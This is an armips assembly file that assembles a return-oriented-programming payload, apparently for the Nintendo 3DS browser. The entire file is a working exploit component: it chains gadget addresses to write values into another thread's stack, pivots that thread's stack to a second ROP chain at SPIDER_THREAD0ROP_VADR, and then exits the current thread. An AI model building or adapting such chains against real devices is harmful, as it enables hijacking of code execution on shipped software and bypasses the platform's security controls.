.nds

.include "../../build/constants.s"

.create "spider_initial_rop.bin",0x0

.orga 0x0
	.word 0xDEADC0DE
.orga 0x4
	;actual ROP start
	; .word 0x0010322c ; inf loop

	;write thread0 initial rop
		.word 0x00113a6c ; pop	{r4, r5, r6, r7, r8, pc}
			.word 0xDEADC0DE
			.word 0xDEADC0DE
			.word 0xDEADC0DE
			.word 0xDEADC0DE
			.word 0xDEADC0DE

		.word 0x00113a84 ; pop {r4, pc}
			.word 0x0FFFFF24 ; r4

		.word 0x002ad574 ; pop {r0, pc}
			.word 0x002d6a34 ; r0 (pop {lr, pc})
		.word 0x00254920 ; str r0, [r4] | pop {r4, pc}
			.word 0x0FFFFF28 ; r4

		.word 0x002ad574 ; pop {r0, pc}
			.word SPIDER_THREAD0ROP_VADR ; r0
		.word 0x00254920 ; str r0, [r4] | pop {r4, pc}
			.word 0x0FFFFF2C ; r4

		.word 0x002ad574 ; pop {r0, pc}
			.word 0x002d6a30 ; r0 (mov sp, lr | pop {lr, pc})
		.word 0x00254920 ; str r0, [r4] | pop {r4, pc}
			.word 0x0FFFFF0C ; r4

	.word 0x002cafe4 ; svcExitThread

.Close
